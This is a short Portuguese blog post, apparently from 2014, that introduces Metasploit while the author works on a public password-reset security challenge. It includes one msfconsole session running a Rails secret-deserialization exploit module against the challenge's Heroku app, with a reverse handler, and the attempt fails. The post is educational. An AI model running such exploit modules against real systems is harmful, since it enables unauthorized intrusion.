---
title: "[Small Bite] Brincando com Metasploit"
date: '2014-08-27T14:03:00-03:00'
slug: small-bite-brincando-com-metasploit
tags:
- metasploit
- security
draft: false
---

Ontem o [@joernchen](https://twitter.com/joernchen) mandou um pequeno [desafio básico de segurança](https://twitter.com/joernchen/status/504304803045208064) pra comunidade. Ele postou um código de uma pequena aplicação, colocou ela no ar, e nos desafiou a resetar a senha do administrador.
  
Confesso que demorei mais do que gostaria mas no fim eu consegui - e foi simples (post sobre isso vem depois).
  
No caminho eu acabei explorando o [Metasploit](http://www.metasploit.com), provavelmente um dos melhores e mais conhecidos pacotes de testes de penetração de segurança. E alguns não sabem disso mas ele não só é código-aberto (existem ferramentas e serviços pagos) como é uma aplicação Rails! Então vale muito a pena acompanhar esse projeto.

O @joernchen já [contribuiu no código](https://github.com/rapid7/metasploit-framework/commits?author=joernchen) do Metasploit incluindo o famigerado exploit para [Remote Code Execution no Rails](https://github.com/rapid7/metasploit-framework/commit/7f3eccd64453c3708ad4cb7ed7a6ea18354bac3d) (calma, as versões novas já não tem mais isso!)

Instalar o Metasploit no seu sistema é simples. Este [blog post](http://www.darkoperator.com/installing-metasploit-in-ubunt/) descreve como. Ele começa falando para baixar um script que faz tudo mas, se você usa RVM ou RBenv ou não usa Ubuntu, faça na mão, é mais simples. Não vou repetir o que já está no post então acompanhe lá.

No final, você deve ter o metasploit instalado e com o comando <tt>msfconsole</tt> a partir de onde já dá pra começar a brincar. Por exemplo, uma das coisas que eu tentei ver foi se o aplicativo do desafio sofria o problema de remote code execution que mencionei acima, pra isso, uma vez dentro do console eu fiz:

```
msf exploit(rails_json_yaml_code_exec) > use exploit/multi/http/rails_secret_deserialization
msf exploit(rails_secret_deserialization) > set RHOST getthisadmin.herokuapp.com
msf exploit(rails_secret_deserialization) > set TARGETURI /reset/_csrf_token
msf exploit(rails_secret_deserialization) > run
[*] Started reverse handler on 192.168.47.172:4444
[*] Checking for cookie _csrf_token
[!] Caution: Cookie not found, maybe you need to adjust TARGETURI
[*] Trying to leverage default controller without cookie confirmation.
[*] Sending cookie _csrf_token
msf exploit(rails_secret_deserialization) > exit
```

E podemos ver que o problema não é esse. No Metasploit você carrega um dos muitos módulos de exploit que quer explorar (veja [lista no próprio código fonte](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http)). Cada exploit tem várias opções pra configurar (execute <tt>show options</tt> para mostrar as configurações). Use o comando <tt>set</tt> para configurar com o site que quer explorar. Finalmente, rode com <tt>run</tt> para executar e ver se tem o exploit ou não.

Eu mesmo não sou um expert em segurança mas conheço o básico e explorar o Metasploit pode ser uma excelente fonte para você entender como funcionam exploits de segurança. O código de cada módulo é em Ruby e é muito fácil de ler.

E já descobriram o desafio do @joernchen? Neste post eu já dei uma grande dica ;-) Comentem se conseguiram, mas não dêem a resposta ainda pra todo mundo poder testar.
